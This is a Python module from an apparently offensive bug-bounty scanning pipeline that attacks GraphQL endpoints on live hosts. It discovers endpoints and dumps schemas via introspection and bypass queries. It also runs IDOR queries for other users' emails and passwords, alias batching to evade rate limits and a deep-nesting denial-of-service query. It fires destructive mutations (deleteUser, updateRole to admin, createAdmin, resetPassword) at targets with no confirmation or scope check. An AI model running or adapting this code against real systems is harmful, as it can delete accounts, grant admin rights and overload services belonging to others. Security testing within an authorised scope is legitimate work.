#!/usr/bin/env python3
# modules/step20_graphql.py — GraphQL Security Testing V7 (UPGRADED)
# Added: IDOR via GraphQL, alias batching rate-limit bypass, field suggestions,
#        mutation testing, DoS via deep query nesting, subscription exposure
# Source: Bug Bounty Bootcamp Ch20 — full GraphQL attack methodology
# MilkyWay Intelligence | Author: Sharlix + M7AI

import json, re, urllib.request, urllib.error
from core.utils import safe_read
from core.http_client import sync_post, sync_get

GRAPHQL_PATHS = [
    "/graphql","/api/graphql","/graphql/v1","/v1/graphql","/v2/graphql",
    "/api/v1/graphql","/api/v2/graphql","/query","/gql","/graph",
    "/graphiql","/playground","/api/query","/data","/api/gql",
]

INTROSPECTION_QUERY = """
{
  __schema {
    types {
      name
      fields {
        name
        type { name kind ofType { name kind } }
        args { name type { name kind } }
      }
    }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}
""".strip()

# Alt introspection for WAF bypass (BB Bootcamp Ch20: disable introspection bypass)
INTROSPECTION_BYPASS_QUERIES = [
    # Inline fragment bypass
    "{ __schema { types { name } } }",
    # Alias bypass
    "{ s: __schema { types { name } } }",
    # POST with GET param bypass
    "query IntrospectionQuery { __schema { types { name } } }",
]

DANGEROUS_FIELDS = [
    "password","secret","token","apiKey","api_key","accessKey","privateKey",
    "ssn","creditCard","cvv","pin","otp","session","cookie","authToken",
    "resetToken","inviteCode","internalId","adminNote","deletedAt","isAdmin",
]

# IDOR test — try to access other users' data (BB Bootcamp Ch20)
IDOR_QUERIES = [
    '{ user(id: "2") { id email username password } }',
    '{ user(id: 2) { id email username } }',
    '{ account(id: "admin") { id email role } }',
    '{ viewer { ... on User { id email } } }',
    '{ users { edges { node { id email password } } } }',
    '{ me { id email } }',
]

# Alias-based batching for rate limit bypass
ALIAS_BATCH_TEMPLATE = """
{{
  a1: {query}
  a2: {query}
  a3: {query}
  a4: {query}
  a5: {query}
}}
"""

# DoS via deep nesting (BB Bootcamp: query depth attack)
DEEP_NEST_QUERY = """
{
  user {
    friends {
      friends {
        friends {
          friends {
            friends {
              id email
            }
          }
        }
      }
    }
  }
}
"""

# Field suggestion — GraphQL hints at valid fields on typos
FIELD_SUGGESTION_QUERY = '{ __typenameX }'


class Step20Graphql:
    def __init__(self, pipeline):
        self.p = pipeline

    def run(self):
        p     = self.p
        out   = p.files["graphql_results"]
        live  = safe_read(p.files.get("fmt_url",""))[:10]
        found = 0

        if not live:
            p.log.warn("GraphQL: no live hosts"); return

        p.log.info("GraphQL V7: introspection + IDOR + batching + nesting + mutations")

        auth_h = {}
        c = getattr(p.args,'cookie',None) or getattr(p.args,'session',None)
        a = getattr(p.args,'authorization',None) or getattr(p.args,'auth',None)
        j = getattr(p.args,'jwt',None) or getattr(p.args,'_jwt_token',None)
        if c: auth_h["Cookie"] = c
        if a: auth_h["Authorization"] = a if a.startswith("Bearer") else f"Bearer {a}"
        if j and "Authorization" not in auth_h:
            auth_h["Authorization"] = f"Bearer {j}" 

        for host in live:
            host = host.rstrip("/")

            for path in GRAPHQL_PATHS:
                url  = host + path
                resp = sync_get(url, headers=auth_h, timeout=6)
                if not resp or resp.get("status",0) not in (200,400,405,422):
                    continue
                body = resp.get("body","").lower()
                if not any(x in body for x in
                           ["graphql","query","__schema","__typename","must provide"]):
                    continue

                p.log.info(f"  GraphQL endpoint: {url}")

                # ── Test 1: Introspection enabled ────────────────────────────
                schema = self._test_introspection(url, auth_h, out)
                if schema:
                    found += 1
                    # Analyze schema for sensitive fields
                    found += self._analyze_schema(url, schema, out)
                    # Test IDOR on discovered types
                    found += self._test_graphql_idor(url, auth_h, schema, out)

                # ── Test 2: Introspection bypass ─────────────────────────────
                elif self._test_introspection_bypass(url, auth_h):
                    p.add_finding("medium","GRAPHQL_INTRO_BYPASS", url,
                                  "Introspection blocked but bypassable via "
                                  "inline fragment/alias technique", "graphql-v7")
                    found += 1

                # ── Test 3: Alias batching (rate limit bypass) ────────────────
                r = self._test_alias_batching(url, auth_h)
                if r:
                    sev, detail = r
                    self._save(out, sev, "GRAPHQL_BATCH_RATELIMIT", url, detail)
                    found += 1

                # ── Test 4: Deep query nesting DoS ───────────────────────────
                r = self._test_deep_nesting(url, auth_h)
                if r:
                    sev, detail = r
                    self._save(out, sev, "GRAPHQL_NESTING_DOS", url, detail)
                    found += 1

                # ── Test 5: Mutation testing ──────────────────────────────────
                r = self._test_mutations(url, auth_h, out)
                found += r

                # ── Test 6: Field suggestions (info leak) ─────────────────────
                r = self._test_field_suggestions(url, auth_h)
                if r:
                    sev, detail = r
                    self._save(out, sev, "GRAPHQL_FIELD_SUGGESTION", url, detail)
                    found += 1

                # ── Test 7: Subscription endpoint ────────────────────────────
                r = self._test_subscriptions(url, auth_h)
                if r:
                    sev, detail = r
                    self._save(out, sev, "GRAPHQL_SUBSCRIPTION", url, detail)
                    found += 1

                break  # Found endpoint on this host

        p.log.success(f"GraphQL V7: {found} findings")

    # ── Test 1: Introspection ─────────────────────────────────────────────────
    def _test_introspection(self, url, auth_h, out) -> dict:
        resp = self._gql_post(url, {"query": INTROSPECTION_QUERY}, auth_h)
        if not resp: return None
        try:
            data = json.loads(resp.get("body","{}"))
            if "data" in data and "__schema" in str(data):
                detail = (f"GraphQL introspection enabled — full schema exposed. "
                          f"Types: {len(data.get('data',{}).get('__schema',{}).get('types',[]))}")
                self._save(out, "high", "GRAPHQL_INTROSPECTION", url, detail)
                return data.get("data",{}).get("__schema",{})
        except Exception:
            pass
        return None

    def _test_introspection_bypass(self, url, auth_h) -> bool:
        """Bug Bounty Bootcamp Ch20: try fragment/alias bypass."""
        for q in INTROSPECTION_BYPASS_QUERIES:
            resp = self._gql_post(url, {"query": q}, auth_h)
            if resp and "__schema" in resp.get("body",""):
                return True
        return False

    # ── Test 2: Schema analysis ───────────────────────────────────────────────
    def _analyze_schema(self, url, schema, out) -> int:
        """Find sensitive fields exposed in schema."""
        found = 0
        schema_str = json.dumps(schema).lower()
        exposed = [f for f in DANGEROUS_FIELDS if f.lower() in schema_str]
        if exposed:
            detail = (f"Sensitive fields in GraphQL schema: "
                      f"{', '.join(exposed[:8])} — queryable via API")
            self._save(out, "high", "GRAPHQL_SENSITIVE_FIELDS", url, detail)
            found += 1
        return found

    # ── Test 3: IDOR via GraphQL (BB Bootcamp Ch20) ────────────────────────────
    def _test_graphql_idor(self, url, auth_h, schema, out) -> int:
        """
        Bug Bounty Bootcamp Ch20: GraphQL IDOR.
        Access other users' data by changing ID in query.
        """
        found = 0
        for query in IDOR_QUERIES:
            resp = self._gql_post(url, {"query": query}, auth_h)
            if not resp: continue
            body = resp.get("body","")
            try:
                data = json.loads(body)
                result = data.get("data",{})
                if result and result != {"me": None}:
                    # Got data → check if it's someone else's
                    result_str = json.dumps(result)
                    if any(x in result_str.lower() for x in
                           ["email","username","password","id"]):
                        if not data.get("errors"):
                            detail = (f"GraphQL IDOR: query '{query[:50]}' returned "
                                      f"user data without authorization check")
                            self._save(out,"critical","GRAPHQL_IDOR",url,detail)
                            found += 1
                            break
            except Exception:
                pass
        return found

    # ── Test 4: Alias batching rate-limit bypass ──────────────────────────────
    def _test_alias_batching(self, url, auth_h):
        """
        Bug Bounty Bootcamp Ch20: aliases bypass rate limits on mutations.
        Send 10 aliases = 10 operations in 1 HTTP request.
        """
        batch_query = "\n".join([
            f"a{i}: __typename" for i in range(10)
        ])
        resp = self._gql_post(url, {"query": f"{{ {batch_query} }}"}, auth_h)
        if not resp: return None
        try:
            data = json.loads(resp.get("body","{}"))
            keys = list(data.get("data",{}).keys())
            if len(keys) >= 5 and all(k.startswith("a") for k in keys[:5]):
                return ("medium",
                    f"GraphQL alias batching: {len(keys)} aliases executed in 1 request "
                    f"— rate limits bypassable for brute force / account lockout bypass")
        except Exception:
            pass
        return None

    # ── Test 5: Deep nesting DoS ──────────────────────────────────────────────
    def _test_deep_nesting(self, url, auth_h):
        """Bug Bounty Bootcamp: deep nesting = server overload."""
        start = __import__("time").time()
        resp  = self._gql_post(url, {"query": DEEP_NEST_QUERY}, auth_h,
                                timeout=15)
        elapsed = __import__("time").time() - start
        if resp and elapsed > 8.0:
            return ("medium",
                f"GraphQL deep nesting DoS: nested query took {elapsed:.1f}s "
                f"— no depth limiting, server may be exhausted by complex queries")
        return None

    # ── Test 6: Mutation discovery ────────────────────────────────────────────
    def _test_mutations(self, url, auth_h, out) -> int:
        """Discover and test dangerous mutations (password change, admin)."""
        found = 0
        DANGEROUS_MUTATIONS = [
            ("mutation { deleteUser(id: 1) { id } }",       "deleteUser"),
            ("mutation { updateRole(id: 1, role: admin) { id } }", "updateRole"),
            ("mutation { createAdmin(email: \"x@y.com\" password: \"x\") { id } }",
             "createAdmin"),
            ("mutation { resetPassword(email: \"admin@test.com\") { success } }",
             "resetPassword"),
        ]
        for query, mut_name in DANGEROUS_MUTATIONS:
            resp = self._gql_post(url, {"query": query}, auth_h)
            if not resp: continue
            body = resp.get("body","")
            try:
                data = json.loads(body)
                if data.get("data") and not data.get("errors"):
                    detail = (f"GraphQL mutation '{mut_name}' executed without "
                              f"authorization — may allow privilege escalation/data deletion")
                    self._save(out,"critical","GRAPHQL_DANGEROUS_MUTATION",url,detail)
                    found += 1
            except Exception:
                pass
        return found

    # ── Test 7: Field suggestions (information disclosure) ───────────────────
    def _test_field_suggestions(self, url, auth_h):
        """GraphQL hints at valid fields via 'Did you mean X?' — info leak."""
        resp = self._gql_post(url, {"query": FIELD_SUGGESTION_QUERY}, auth_h)
        if not resp: return None
        body = resp.get("body","")
        if "did you mean" in body.lower() or "suggestion" in body.lower():
            # Extract suggested field
            m = re.search(r'"Did you mean ["\'](\w+)["\']', body, re.I)
            suggested = m.group(1) if m else "unknown"
            return ("low",
                f"GraphQL field suggestions enabled — server reveals valid field "
                f"names via error messages (e.g. '{suggested}')")
        return None

    # ── Test 8: WebSocket subscriptions ──────────────────────────────────────
    def _test_subscriptions(self, url, auth_h):
        """Check if subscriptions are exposed (real-time data leak)."""
        sub_query = "{ __schema { subscriptionType { name fields { name } } } }"
        resp = self._gql_post(url, {"query": sub_query}, auth_h)
        if not resp: return None
        try:
            data = json.loads(resp.get("body","{}"))
            sub_type = (data.get("data",{})
                           .get("__schema",{})
                           .get("subscriptionType"))
            if sub_type and sub_type.get("fields"):
                fields = [f["name"] for f in sub_type["fields"][:5]]
                return ("medium",
                    f"GraphQL subscriptions exposed: {', '.join(fields)} — "
                    f"real-time data streams accessible to clients")
        except Exception:
            pass
        return None

    # ── Helpers ───────────────────────────────────────────────────────────────
    def _gql_post(self, url, body, extra_headers, timeout=10) -> dict:
        try:
            data = json.dumps(body).encode()
            hdrs = {"Content-Type":"application/json",
                    "User-Agent": self.p.bypass.ua(), **extra_headers}
            req  = urllib.request.Request(url, data=data,
                                          headers=hdrs, method="POST")
            resp = urllib.request.urlopen(req, timeout=timeout)
            return {"status": resp.status,
                    "body":   resp.read(100000).decode("utf-8","ignore")}
        except urllib.error.HTTPError as e:
            try: body_r = e.read(5000).decode("utf-8","ignore")
            except: body_r = ""
            return {"status": e.code, "body": body_r}
        except Exception:
            return None

    def _save(self, out, sev, vtype, url, detail, response: str = "", payload: str = ""):
        with open(out,"a") as f:
            f.write(f"{vtype}: {url} | {detail}\n")
        self.p.add_finding(sev, vtype, url, detail, "graphql-v7", response=response, payload=payload)
